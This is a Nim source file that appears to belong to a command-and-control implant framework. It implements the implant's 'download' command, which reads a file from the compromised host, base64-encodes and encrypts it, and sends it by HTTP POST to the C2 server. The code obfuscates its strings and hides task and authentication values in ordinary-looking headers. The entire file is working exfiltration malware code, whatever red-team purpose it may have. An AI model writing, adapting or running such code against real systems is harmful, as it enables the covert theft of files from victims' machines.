#[
    Cross-Platform download Command
    Upload files to C2 server (download from implant perspective)
    Compatible with Linux, macOS, and other Unix-like systems
]#

import httpclient, strutils, os, base64
import ../../util/strenc
import ../../util/crypto
import ../../core/webClientListener

proc download*(li: webClientListener.Listener, cmdGuid: string, args: seq[string]): string =
    try:
        if args.len != 1:
            return obf("ERROR: download requires exactly one argument.\nUsage: download <file_path>")
        
        let filePath = args[0]
        
        if not fileExists(filePath):
            return obf("ERROR: File does not exist: ") & filePath
        
        let info = getFileInfo(filePath)
        if info.kind != pcFile:
            return obf("ERROR: Path is not a file: ") & filePath
        
        when defined verbose:
            echo obf("DEBUG: Uploading file to C2: ") & filePath
        
        # Read and encode file content
        let fileContent = readFile(filePath)
        let encodedContent = base64.encode(fileContent)
        
        # Build C2 upload URL
        var uploadUrl = li.listenerType.toLowerAscii() & "://"
        if li.listenerHost != "":
            uploadUrl = uploadUrl & li.listenerHost
        else:
            uploadUrl = uploadUrl & li.implantCallbackIp & ":" & li.listenerPort
        uploadUrl = uploadUrl & li.taskPath & "/u"
        
        # Create HTTP client
        var client = newHttpClient()
        client.headers = newHttpHeaders()
        client.headers["User-Agent"] = li.userAgent
        client.headers["X-Request-ID"] = li.id
        client.headers["Content-MD5"] = cmdGuid  # Task GUID
        client.headers["X-Correlation-ID"] = li.httpAllowCommunicationKey
        client.headers["Content-Type"] = "application/octet-stream"
        
        # Encrypt using crypto's AES function
        let encryptedContent = encryptData(encodedContent, li.UNIQUE_XOR_KEY)

        # Send file to C2
        let response = client.post(uploadUrl, encryptedContent)

        client.close()

        when defined verbose:
            echo obf("DEBUG: Upload response status: ") & response.status

        if response.status.startsWith("200"):
            return obf("File uploaded successfully to C2 server:\n") &
                   obf("File: ") & filePath & "\n" &
                   obf("Size: ") & $fileContent.len & obf(" bytes")
        else:
            return obf("ERROR: Upload failed with status: ") & response.status

    except Exception as e:
        when defined verbose:
            echo obf("DEBUG: download failed: ") & e.msg
        return obf("ERROR: File upload failed - ") & e.msg 